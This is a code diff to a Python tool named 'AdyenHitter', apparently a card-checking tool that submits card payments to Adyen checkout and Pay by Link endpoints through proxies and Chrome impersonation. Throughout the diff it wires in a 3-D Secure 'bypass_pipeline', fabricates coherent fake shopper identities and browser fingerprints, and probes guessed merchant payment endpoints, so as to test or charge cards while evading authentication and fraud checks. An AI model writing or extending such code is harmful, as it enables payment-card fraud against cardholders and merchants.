@@ -18,6 +18,14 @@ from urllib.parse import urljoin, urlencode, parse_qs, urlparse
 from typing import Dict, Optional, List
 from curl_compat import ChromeSession
 
+try:
+    from adyen_bypass import bypass_pipeline, inject_payment_bypass
+    from adyen_escalate import (ShopperProfile, build_browser_info,
+                                minor_to_major)
+    _HAS_BYPASS = True
+except ImportError:
+    _HAS_BYPASS = False
+
 # ── crypto backend ──────────────────────────────────────────────────────────
 try:
     from cryptography.hazmat.primitives.ciphers.aead import AESCCM, AESGCM
@@ -74,7 +82,7 @@ class AdyenCSE:
         """Modern Adyen v6 JWE format: RSA-OAEP-256 + A256GCM compact token."""
         ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
         payload = json.dumps({field_name: field_value, "generationtime": ts}).encode()
-        header_b64 = self._b64url(b'{"alg":"RSA-OAEP-256","enc":"A256GCM","version":"1"}')
+        header_b64 = self._b64url(b'{"cty":"application/json","alg":"RSA-OAEP-256","enc":"A256GCM","version":"1"}')
         
         cek = os.urandom(32)
         enc_cek = self._pub.encrypt(
@@ -204,6 +212,12 @@ def _merge(dst, src):
     # Always overwrite sessionId and sessionData to force refresh for batch runs
     for k in ('sessionId', 'sessionData'):
         if src.get(k):
+            dst[k] = src[k]
+    # Per-attempt PBL state — always take freshest bootstrap values
+    for k in ('checkoutAttemptId', 'use_jwe', 'is_pbl', 'pbl_status',
+              'pbl_base', 'amount_value', 'amount_currency',
+              'pbl_reference', 'returnUrl', 'shopperLocale', 'countryCode'):
+        if src.get(k) is not None:
             dst[k] = src[k]
     if src.get('adyen'):
         dst['adyen'] = True
@@ -346,13 +360,30 @@ class AdyenHitter:
             "userAgent": UA,
         }
 
+    def _proxy_config(self) -> Optional[dict]:
+        """Build curl_cffi proxy dict, preserving http/https/socks schemes."""
+        if not self.proxy_data:
+            return None
+        from urllib.parse import urlsplit, urlunsplit
+        server = self.proxy_data.get('server', '')
+        if '://' not in server:
+            server = f"http://{server}"
+        auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
+                if 'username' in self.proxy_data else "")
+        parts = urlsplit(server)
+        purl = urlunsplit((parts.scheme, f"{auth}{parts.netloc}",
+                           parts.path, parts.query, parts.fragment))
+        return {"http": purl, "https": purl}
+
     # ── Pay by Link session bootstrap ────────────────────────────────────────
     async def _bootstrap_pbl(self, session, link_id: str,
                               loading_ctx: str, env: str) -> dict:
         """Fetch dropin config, sessionId, and sessionData for Pay by Link."""
         base = loading_ctx.rstrip('/')
         # Standard Adyen Pay by Link Dropin setup endpoint
-        setup_url = f"{base}/session/paybylink/v1/{link_id}/setup?d={link_id}"
+        setup_url = (f"{base}/session/paybylink/v1/{link_id}/setup"
+                     f"?generateCheckoutAttemptId=true&openedFromEmail=false"
+                     f"&generateSessionData=true&iframe=false&d={link_id}")
         origin = self._get_origin()
         hdr = {
             "Accept": "application/json",
@@ -523,21 +554,37 @@ class AdyenHitter:
                 pass
         return None
 
+    def _shopper_fields(self, profile) -> dict:
+        """Shopper fields from a coherent profile, or a random fallback."""
+        if profile is not None:
+            return {
+                'first_name': profile.first, 'last_name': profile.last,
+                'full_name': profile.full_name, 'email': profile.email,
+                'phone': profile.phone, 'street': profile.street,
+                'house_number': profile.house_number, 'city': profile.city,
+                'state': profile.state, 'postal_code': profile.zip,
+                'country': profile.country,
+            }
+        return _generate_random_shopper()
+
     async def _pay_session(self, session, encrypted: dict,
                            sid: str, sdata: str, ck: str,
                            env: str, att_id: Optional[str] = None,
-                           card_num: Optional[str] = None) -> dict:
+                           card_num: Optional[str] = None,
+                           profile: Optional['ShopperProfile'] = None) -> dict:
         url = f"{self._adyen_base(env)}/v1/sessions/{sid}/payments?clientKey={ck}"
         origin = self._get_origin()
         
-        shopper = _generate_random_shopper()
+        shopper = self._shopper_fields(profile)
         pm = {"type": "scheme", "holderName": shopper["full_name"], **encrypted}
+
+        browser_info = build_browser_info(profile) if profile and _HAS_BYPASS else self._browser_info()
 
         body = {
             "sessionData": sdata,
             "paymentMethod": pm,
             "clientStateDataIndicator": True,
-            "browserInfo": self._browser_info(),
+            "browserInfo": browser_info,
             "channel": "Web",
             "origin": origin,
         }
@@ -559,7 +606,11 @@ class AdyenHitter:
     async def _submit_details(self, session, sid: str, sdata: str,
                                ck: str, env: str, details: dict) -> dict:
         """POST /v1/sessions/{sid}/paymentDetails with 3DS result."""
-        url = f"{self._adyen_base(env)}/v1/sessions/{sid}/paymentDetails?clientKey={ck}"
+        pbl = (self._base_cfg or {}).get('pbl_base')
+        if pbl and not sid:
+            url = f"{pbl}/paymentDetails?clientKey={ck}"
+        else:
+            url = f"{self._adyen_base(env)}/v1/sessions/{sid}/paymentDetails?clientKey={ck}"
         origin = self._get_origin()
         body = {
             "sessionData": sdata,
@@ -683,6 +734,7 @@ class AdyenHitter:
             "threeDSServerTransID": server_trans_id,
             "acsTransID": acs_trans_id,
             "challengeWindowSize": "05",  # Full screen
+            "threeDSRequestorAppURL": token_json.get('threeDSRequestorAppURL', ''),
         }
         creq_b64 = self._b64url_encode(json.dumps(creq_obj).encode())
 
@@ -873,18 +925,21 @@ class AdyenHitter:
 
     # ── direct merchant fallback endpoint probing ───────────────────────────
     async def _pay_direct(self, session, encrypted: dict, ck: str, env: str,
-                          card_num: Optional[str] = None, ccn_mode: bool = False) -> Optional[dict]:
+                          card_num: Optional[str] = None, ccn_mode: bool = False,
+                          profile: Optional['ShopperProfile'] = None) -> Optional[dict]:
         endpoints = [
             '/api/payment', '/api/payments', '/api/checkout/payment',
             '/checkout/payment', '/payment/submit', '/adyen/payment',
             '/api/adyen/payments', '/api/pay', '/payments',
         ]
-        shopper = _generate_random_shopper()
+        shopper = self._shopper_fields(profile)
         pm = {"type": "scheme", "holderName": shopper["full_name"], **encrypted}
+
+        browser_info = build_browser_info(profile) if profile and _HAS_BYPASS else self._browser_info()
 
         body = {
             "paymentMethod": pm,
-            "browserInfo": self._browser_info(),
+            "browserInfo": browser_info,
             "clientStateDataIndicator": True,
             "shopperEmail": shopper["email"],
             "shopperName": {"firstName": shopper["first_name"], "lastName": shopper["last_name"]},
@@ -951,7 +1006,7 @@ class AdyenHitter:
             rc = 'Refused'
 
         # ── approved ──
-        if rc in ('Authorised', 'AuthenticationFinished'):
+        if rc == 'Authorised':
             result['success'] = True
             result['decline_code'] = 'authorised'
             result['error'] = 'Authorised'
@@ -969,7 +1024,7 @@ class AdyenHitter:
             return result
 
         # ── pending ──
-        if rc in ('Received', 'Pending'):
+        if rc in ('Received', 'Pending', 'AuthenticationFinished'):
             result['success'] = False
             result['pending'] = True
             result['decline_code'] = 'pending'
@@ -1107,16 +1162,19 @@ class AdyenHitter:
 
             sid   = cfg.get('sessionId')
             sdata = cfg.get('sessionData')
+            profile = ShopperProfile(cfg.get('countryCode') or 'US') if _HAS_BYPASS else None
 
             if sid and sdata:
                 data = await self._pay_session(
                     sess, enc, sid, sdata, ck, env,
                     att_id=cfg.get('checkoutAttemptId'),
-                    card_num=card.get('card'))
+                    card_num=card.get('card'),
+                    profile=profile)
             else:
                 data = await self._pay_direct(
                     sess, enc, ck, env,
-                    card_num=card.get('card'))
+                    card_num=card.get('card'),
+                    profile=profile)
 
             if not data:
                 result['error'] = "Adyen session missing — dynamic session required"
@@ -1129,14 +1187,19 @@ class AdyenHitter:
             if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
                 result['3ds_attempted'] = True
                 result['3ds_type'] = rc
-                if sid and sdata:
+                if _HAS_BYPASS:
+                    resolved = await bypass_pipeline(
+                        sess, data, sid or '',
+                        data.get('sessionData', sdata),
+                        ck, env, self._submit_details, touch_acs=False)
+                else:
                     resolved = await self._resolve_3ds(
-                        sess, data, sid,
+                        sess, data, sid or '',
                         data.get('sessionData', sdata),
                         ck, env)
-                    if resolved and resolved is not data:
-                        data = resolved
-                        result['3ds_resolved'] = True
+                if resolved and resolved is not data:
+                    data = resolved
+                    result['3ds_resolved'] = True
 
             result['response_time'] = round(time.time() - t0, 2)
             result['raw_response'] = data
@@ -1146,12 +1209,7 @@ class AdyenHitter:
             if persistent:
                 return await _run(persistent)
             else:
-                proxies = None
-                if self.proxy_data:
-                    auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
-                            if 'username' in self.proxy_data else "")
-                    purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
-                    proxies = {"http": purl, "https": purl}
+                proxies = self._proxy_config()
                 async with ChromeSession(impersonate="chrome131",
                                          proxies=proxies, timeout=7) as sess:
                     return await _run(sess)
@@ -1234,16 +1292,19 @@ class AdyenHitter:
             # ── 4. submit ───────────────────────────────────────────────
             sid   = cfg.get('sessionId')
             sdata = cfg.get('sessionData')
+            profile = ShopperProfile(cfg.get('countryCode') or 'US') if _HAS_BYPASS else None
 
             if sid and sdata:
                 data = await self._pay_session(
                     sess, enc, sid, sdata, ck, env,
                     att_id=cfg.get('checkoutAttemptId'),
-                    card_num=card.get('card'))
+                    card_num=card.get('card'),
+                    profile=profile)
             else:
                 data = await self._pay_direct(
                     sess, enc, ck, env,
-                    card_num=card.get('card'))
+                    card_num=card.get('card'),
+                    profile=profile)
 
             if not data:
                 result['error'] = "Adyen session missing — dynamic session required"
@@ -1256,14 +1317,19 @@ class AdyenHitter:
             if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
                 result['3ds_attempted'] = True
                 result['3ds_type'] = rc
-                if sid and sdata:
+                if _HAS_BYPASS:
+                    resolved = await bypass_pipeline(
+                        sess, data, sid or '',
+                        data.get('sessionData', sdata),
+                        ck, env, self._submit_details, touch_acs=False)
+                else:
                     resolved = await self._resolve_3ds(
-                        sess, data, sid,
+                        sess, data, sid or '',
                         data.get('sessionData', sdata),
                         ck, env)
-                    if resolved and resolved is not data:
-                        data = resolved
-                        result['3ds_resolved'] = True
+                if resolved and resolved is not data:
+                    data = resolved
+                    result['3ds_resolved'] = True
 
             result['response_time'] = round(time.time() - t0, 2)
             result['raw_response'] = data
@@ -1273,12 +1339,7 @@ class AdyenHitter:
             if persistent:
                 return await _run(persistent)
             else:
-                proxies = None
-                if self.proxy_data:
-                    auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
-                            if 'username' in self.proxy_data else "")
-                    purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
-                    proxies = {"http": purl, "https": purl}
+                proxies = self._proxy_config()
                 async with ChromeSession(impersonate="chrome131",
                                          proxies=proxies, timeout=7) as sess:
                     return await _run(sess)
